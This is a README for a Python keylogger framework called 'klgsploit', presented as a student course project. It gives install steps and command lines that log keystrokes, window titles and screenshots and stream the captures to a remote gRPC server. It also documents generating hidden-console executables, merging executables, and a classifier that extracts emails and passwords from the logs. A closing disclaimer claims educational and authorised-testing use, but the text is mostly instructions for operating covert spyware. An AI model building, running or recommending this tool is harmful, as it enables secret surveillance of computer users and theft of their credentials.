# keylogger-advprog

A keylogger implemented in Python using advanced tools and architectural patterns.

## Project Summary

This project was designed as an all-in-one keylogging framework, similar in spirit to a modular multi-tool. The repository integrates multiple functionalities:

- Keylogging
- Saving captured keystrokes with window information into a text file
- Screenshot capture of the active window
- gRPC communication for remote data transmission and server-side actions
- Executable generation with configurable options
- Cross-platform support
- Prebuilt Linux executables available in the `build` folder

An **Observer Design Pattern** was implemented within the classifier module to trigger notifications when sensitive data (emails, passwords, etc.) is detected.

---

## Installing Dependencies

```bash
python3 -m venv venv
source venv/bin/activate          # On Windows: venv\Scripts\activate
pip install pynput pillow mss python-xlib grpcio grpcio-tools pyinstaller ttkbootstrap
```

Or install packages individually:

```bash
pip install pynput
pip install pillow
pip install mss
pip install python-xlib
pip install grpcio
pip install grpcio-tools
pip install pyinstaller
pip install ttkbootstrap
```

---

## Project Structure

```
keylogger-advprog/
├── restructured/               # Main source code
│   ├── klgsploit_cli.py        # CLI version
│   ├── klgsploit_gui.py        # GUI version
│   ├── keylogtest.py           # Linux keylogger module
│   ├── keylogwin.py            # Windows keylogger module
│   ├── capture.py              # Screenshot module
│   ├── classifier.py           # Email/password extractor + AI logic
│   ├── grpcsrv.py              # gRPC server
│   ├── cln.py                  # gRPC client
│   └── protos/                 # Protobuf definitions
│       ├── server.proto
│       ├── server_pb2.py
│       └── server_pb2_grpc.py
├── build/                      # Compiled executables
│   ├── klgsploit_cli
│   └── klgsploit_gui
├── classifier.py               # Standalone classifier
├── keylog.txt                  # Output log file
└── README.md
```

---

## CLI Usage

Navigate to the source folder:

```bash
cd restructured
```

Run keylogger:

```bash
python3 klgsploit_cli.py --run
```

Run with timestamps and window titles:

```bash
python3 klgsploit_cli.py --run -t -m
```

Run with screenshots:

```bash
python3 klgsploit_cli.py --run -s -i 30
```

Generate Linux executable:

```bash
python3 klgsploit_cli.py --genexe mylogger -lnx
```

Generate Windows executable:

```bash
python3 klgsploit_cli.py --genexe mylogger -win
```

Generate with all features:

```bash
python3 klgsploit_cli.py --genexe superlogger -lnx -t -m -s
```

Classify log file:

```bash
python3 klgsploit_cli.py --classify keylog.txt
```

Start gRPC server:

```bash
python3 klgsploit_cli.py --server --grpc-port 50051
```

Run with remote logging:

```bash
python3 klgsploit_cli.py --run --grpc 192.168.1.100:50051
```

---

## CLI Options Reference

| Option | Description |
|--------|-------------|
| `--run` | Run keylogger |
| `--genexe NAME` | Generate executable |
| `-t` | Enable timestamps |
| `-m` | Log window titles |
| `-s` | Enable screenshots |
| `-i SECONDS` | Screenshot interval |
| `-o FILE` | Output file |
| `-win` | Target Windows |
| `-lnx` | Target Linux |
| `-mac` | Target macOS |
| `--grpc HOST:PORT` | Send logs via gRPC |
| `--server` | Start gRPC server |
| `--classify FILE` | Extract sensitive data |
| `--merge EXE1 EXE2` | Merge executables |
| `--noconsole` | Hide console |
| `--onefile` | Single file executable |

---

## GUI Usage

```bash
cd restructured
python3 klgsploit_gui.py
```

GUI Features:

- Keylogger configuration
- Screenshot controls
- Executable generation
- Log classification
- Log viewer
- gRPC server receiver

---

## Using Prebuilt Executables

```bash
./build/klgsploit_cli --help
./build/klgsploit_gui
```

---

## gRPC Setup

Generate protobuf files:

```bash
cd restructured
python3 -m grpc_tools.protoc -Iprotos \
    --python_out=protos \
    --grpc_python_out=protos \
    protos/server.proto
```

Start server:

```bash
python3 klgsploit_cli.py --server --grpc-port 50051
```

Run client with remote logging:

```bash
python3 klgsploit_cli.py --run --grpc IP:PORT
```

---

## Classifier Module

The classifier extracts potential emails and passwords from logs using regular expressions.  
Standalone usage:

```bash
python3 classifier.py keylog.txt
```

Output:

- JSON file containing detected data
- Counts and statistics

---

## Cross-Platform Support

| Platform | Keylogging | Screenshots | Window Titles |
|----------|------------|-------------|---------------|
| Linux | pynput + xlib | mss / pillow | xlib |
| Windows | pynput | pillow | ctypes / pygetwindow |
| macOS | pynput | pillow | appkit / quartz |

---

## Building Executables

CLI version:

```bash
cd restructured
python3 -m PyInstaller --onefile --name klgsploit_cli \
    --distpath ../build klgsploit_cli.py
```

GUI version:

```bash
python3 -m PyInstaller --onefile --noconsole \
    --name klgsploit_gui --distpath ../build klgsploit_gui.py
```

---

## Troubleshooting

- pynput issues on Linux:

```bash
sudo usermod -aG input $USER
```

- Missing gRPC modules:

```bash
pip install grpcio grpcio-tools
```

- Screenshot problems:

```bash
pip install pillow mss
```

- Missing tkinter:

Install `python3-tk` (Debian/Ubuntu) or `tk` (Arch).

---

## Disclaimer

This tool is intended strictly for educational purposes and authorized security testing.

Unauthorized use of keylogging software is illegal.  
The authors assume no responsibility for misuse.

Always obtain proper authorization before testing any system.

---

## Authors

Developed as part of an advanced programming course project.

- Wail Sari Bey
- Ines Allag
- Anes Ragoub
- Amani Sahraoui
